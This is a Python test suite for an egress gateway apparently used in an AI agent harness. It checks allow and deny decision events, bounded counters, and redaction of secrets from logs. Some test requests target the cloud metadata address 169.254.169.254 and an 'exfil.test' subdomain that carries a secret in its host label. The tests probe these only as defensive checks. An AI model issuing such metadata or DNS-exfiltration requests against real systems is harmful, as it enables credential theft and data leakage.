# SPDX-License-Identifier: LicenseRef-AGPL-3.0-or-later-with-Commons-Clause
"""Per-request decision records and counters as evidence events; secrets never in logs or events; resource bounds."""
import json

import pytest
from agent_harness.qa import canon
from agent_harness.qa.egress import AllowEntry, EgressPolicy
from agent_harness.qa.redaction import PatternRedactor, RedactionConfig
from qa_egress import GatewayLimits
from qa_egress.records import KINDS, LIMITS_HIT, OUTCOMES

from qa_eg_support import (ScriptedResolver, Upstream, canary_value, get, make_gateway, ok, private_entry, raw_request, redirect)


def run(requests, *, up=None, **kw):
    with Upstream() as upstream:
        up = upstream
        server, resolver = make_gateway(up.port, **kw)
        with server as gw:
            for r in requests(up, gw):
                pass
            gw.wait_idle()
            return gw.events(), gw.summary(), gw.records(), gw.counts(), up


def test_an_allowed_request_is_one_event_with_the_decision_and_its_hash():
    def reqs(up, gw):
        yield get(gw.port, f"http://app.test:{up.port}/a/b?x=1")
    events, summary, records, counts, up = run(reqs)
    (event,) = events
    assert event["kind"] == "EgressDecision" and event["request_kind"] == "http" and event["outcome"] == "relayed"
    d = event["decision"]
    assert d["verdict"] == "ALLOW" and d["host"] == "app.test" and d["pinned_address"] == "127.0.0.1" and d["addresses"] == ["127.0.0.1"]
    assert event["decision_hash"] == canon.canon_hash(d) == records[0].decision.record_hash
    assert event["status"] == 200 and event["bytes_down"] > 0 and event["bytes_up"] > 0 and event["duration_ms"] >= 0
    assert "/a/b" not in json.dumps(events) and "x=1" not in json.dumps(events)


def test_a_denial_is_an_event_with_reason_codes_and_no_path_or_query():
    def reqs(up, gw):
        yield get(gw.port, "http://169.254.169.254/latest/meta-data/iam?token=XYZ")
        yield get(gw.port, f"http://other.test:{up.port}/secret/path?k=v")
    events, summary, records, counts, up = run(reqs)
    assert [e["decision"]["verdict"] for e in events] == ["DENY", "DENY"]
    assert [e["decision"]["reasons"] for e in events] == [["DENY_METADATA_ADDRESS"], ["DENY_NOT_LISTED"]]
    text = json.dumps(events) + json.dumps(summary)
    assert all(bad not in text for bad in ("latest", "iam", "XYZ", "secret/path", "k=v", "token"))
    assert [e["outcome"] for e in events] == ["denied", "denied"] and [e["status"] for e in events] == [403, 403]


def test_a_redirect_hop_is_its_own_decision_event_with_the_same_sequence_number():
    def reqs(up, gw):
        up.routes["/r"] = redirect("http://169.254.169.254/")
        up.routes["/ok"] = redirect("/next")
        yield get(gw.port, f"http://app.test:{up.port}/r")
        yield get(gw.port, f"http://app.test:{up.port}/ok")
    events, summary, records, counts, up = run(reqs)
    kinds = [(e["seq"], e["request_kind"], e["decision"]["verdict"]) for e in events]
    assert kinds == [(1, "http", "ALLOW"), (1, "redirect", "DENY"), (2, "http", "ALLOW"), (2, "redirect", "ALLOW")]
    assert counts["allowed"] == 3 and counts["denied"] == 1 and counts["refused"] == 1 and counts["relayed"] == 1


def test_counters_and_denied_hosts_by_host_only():
    def reqs(up, gw):
        yield get(gw.port, f"http://app.test:{up.port}/ok")
        for _ in range(3):
            yield get(gw.port, f"http://evil.test:{up.port}/a?x=1")
        yield get(gw.port, f"http://evil.test:{up.port}/b")
        yield get(gw.port, "http://169.254.169.254/")
        yield raw_request(gw.port, b"GET /x HTTP/1.1\r\n\r\n")
    events, summary, records, counts, up = run(reqs)
    assert summary["kind"] == "EgressSummary" and summary["denied_hosts"] == [["169.254.169.254", 1], ["evil.test", 4]]
    assert summary["counts"]["denied"] == 5 and summary["counts"]["allowed"] == 1 and summary["counts"]["refused"] == 1
    assert summary["counts"]["requests"] == 7 and summary["counts"]["connections"] == 7
    assert summary["policy_id"].startswith("rcv1:") and len(summary["policy_id"]) == len("rcv1:") + 64


def test_the_event_shape_is_the_runners_for_an_egress_decision_plus_the_gateways_own_fields():
    def reqs(up, gw):
        yield get(gw.port, f"http://app.test:{up.port}/ok")
    events, *_ = run(reqs)
    assert {"decision", "decision_hash", "kind"} <= set(events[0])
    assert set(events[0]) - {"decision", "decision_hash", "kind"} == {"seq", "request_kind", "outcome", "status", "bytes_up", "bytes_down", "duration_ms"}


def test_every_kind_outcome_and_limit_name_a_record_can_hold_is_from_a_closed_vocabulary():
    assert set(KINDS) == {"http", "connect", "upgrade", "malformed"}
    assert "relayed" in OUTCOMES and "denied" in OUTCOMES and "tunnelled" in OUTCOMES
    from qa_egress.records import Ledger
    ledger = Ledger(10, 10, "rcv1:" + "0" * 64)
    assert {"limit_" + n for n in LIMITS_HIT} <= set(ledger.counts)


def test_the_record_log_is_bounded_and_drops_are_counted():
    with Upstream() as up:
        server, _ = make_gateway(up.port, limits=GatewayLimits(max_records=3, read_timeout_s=2.0))
        with server as gw:
            for i in range(8):
                get(gw.port, f"http://app.test:{up.port}/{i}")
            gw.wait_idle()
            assert len(gw.records()) == 3 and gw.counts()["dropped_records"] == 5 and gw.counts()["requests"] == 8
            assert len(gw.drain_records()) == 3 and gw.records() == ()


def test_distinct_denied_hosts_are_bounded_with_an_overflow_bucket():
    with Upstream() as up:
        server, _ = make_gateway(up.port, limits=GatewayLimits(max_denied_hosts=2, read_timeout_s=2.0))
        with server as gw:
            for i in range(5):
                get(gw.port, f"http://h{i}.test:{up.port}/")
            gw.wait_idle()
            hosts = dict(gw.summary()["denied_hosts"])
            assert len(hosts) == 3 and hosts["(other)"] == 3


def test_a_tunnel_and_an_upgrade_are_recorded_with_their_byte_counts():
    from qa_eg_support import RawUpstream
    with RawUpstream("echo") as raw:
        policy = EgressPolicy(entries=(private_entry("app.test", raw.port, schemes=("https",)),))
        server, _ = make_gateway(raw.port, policy=policy)
        with server as gw:
            import socket
            with socket.create_connection(("127.0.0.1", gw.port), timeout=3) as s:
                s.settimeout(3)
                s.sendall(f"CONNECT app.test:{raw.port} HTTP/1.1\r\n\r\n".encode())
                s.recv(4096)
                s.sendall(b"abc" * 100)
                got = b""
                while len(got) < 300:
                    got += s.recv(4096)
            gw.wait_idle()
            (rec,) = gw.records()
            assert rec.kind == "connect" and rec.outcome == "tunnelled" and rec.status == 200
            assert rec.bytes_up >= 300 and rec.bytes_down >= 300 and rec.decision.purpose == "connection"


# ---- secrets never in logs --------------------------------------------------------------------------------------------------------
def test_secrets_in_the_url_headers_and_bodies_reach_no_record_event_counter_or_log_line():
    secret = canary_value("s1")
    lines = []
    with Upstream() as up:
        up.routes["/r"] = redirect(f"http://app.test:{up.port}/next?sig={secret}")
        up.routes["/set"] = ok("body " + secret, extra=[f"Set-Cookie: sid={secret}"])
        server, _ = make_gateway(up.port, log=lines.append,
                                 redactor=PatternRedactor(RedactionConfig(denylist=(secret,))))
        with server as gw:
            headers = [("Authorization", f"Bearer {secret}"), ("Proxy-Authorization", f"Basic {secret}"), ("Cookie", f"sid={secret}"),
                       ("X-Api-Key", secret)]
            get(gw.port, f"http://app.test:{up.port}/path/{secret}?token={secret}#{secret}", headers=headers)
            get(gw.port, f"http://app.test:{up.port}/r?a={secret}", headers=headers)
            get(gw.port, f"http://app.test:{up.port}/set?a={secret}", headers=headers, method="POST", body=secret.encode())
            get(gw.port, f"http://evil.test:{up.port}/x/{secret}?k={secret}", headers=headers)
            raw_request(gw.port, f"CONNECT 169.254.169.254:443 HTTP/1.1\r\nProxy-Authorization: Basic {secret}\r\n\r\n".encode())
            raw_request(gw.port, f"GET /{secret} HTTP/1.1\r\nCookie: {secret}\r\n\r\n".encode())
            raw_request(gw.port, f"BAD {secret}\r\n\r\n".encode())
            gw.wait_idle()
            everything = json.dumps(gw.events()) + json.dumps(gw.summary()) + repr(gw.records()) + "\n".join(lines)
    assert secret not in everything and lines


def test_a_host_label_that_carries_a_secret_is_recorded_as_evidence_but_never_logged():
    secret = canary_value("s2")
    lines = []
    with Upstream() as up:
        server, _ = make_gateway(up.port, log=lines.append, redactor=PatternRedactor(RedactionConfig(denylist=(secret,))))
        with server as gw:
            get(gw.port, f"http://{secret.lower()}.exfil.test:{up.port}/")
            gw.wait_idle()
            # the evidence event is raw (the runner's evidence guard redacts it before sealing); the log line is redacted here
            assert secret.lower() in json.dumps(gw.events())
            assert lines and not any(secret.lower() in line.lower() for line in lines)


def test_log_lines_hold_only_closed_vocabulary_fields_and_a_host():
    lines = []
    with Upstream() as up:
        server, _ = make_gateway(up.port, log=lines.append)
        with server as gw:
            get(gw.port, f"http://app.test:{up.port}/a?b=c", headers=[("Authorization", "Bearer " + canary_value("l1"))])
            get(gw.port, "http://169.254.169.254/x?y=z")
            gw.wait_idle()
    assert len(lines) == 2
    for line in lines:
        fields = dict(part.split("=", 1) for part in line.split(" ")[1:])
        assert set(fields) <= {"kind", "outcome", "status", "limit", "reason", "host", "verdict"}
        assert "/a" not in line and "b=c" not in line and canary_value("l1") not in line and "/x" not in line


def test_a_log_line_the_redactor_refuses_is_dropped_and_counted_not_written():
    class Refuses:
        policy_id = "rcv1:" + "2" * 64

        def redact(self, data, media_type):
            raise RuntimeError("boom")
    lines = []
    with Upstream() as up:
        server, _ = make_gateway(up.port, log=lines.append, redactor=Refuses())
        with server as gw:
            get(gw.port, f"http://app.test:{up.port}/")
            gw.wait_idle()
            assert lines == [] and gw.counts()["log_dropped"] == 1


def test_a_failing_log_sink_does_not_fail_the_request():
    def broken(line):
        raise OSError("disk full")
    with Upstream() as up:
        server, _ = make_gateway(up.port, log=broken)
        with server as gw:
            assert get(gw.port, f"http://app.test:{up.port}/").status == 200
            gw.wait_idle()
            assert gw.counts()["log_dropped"] == 1
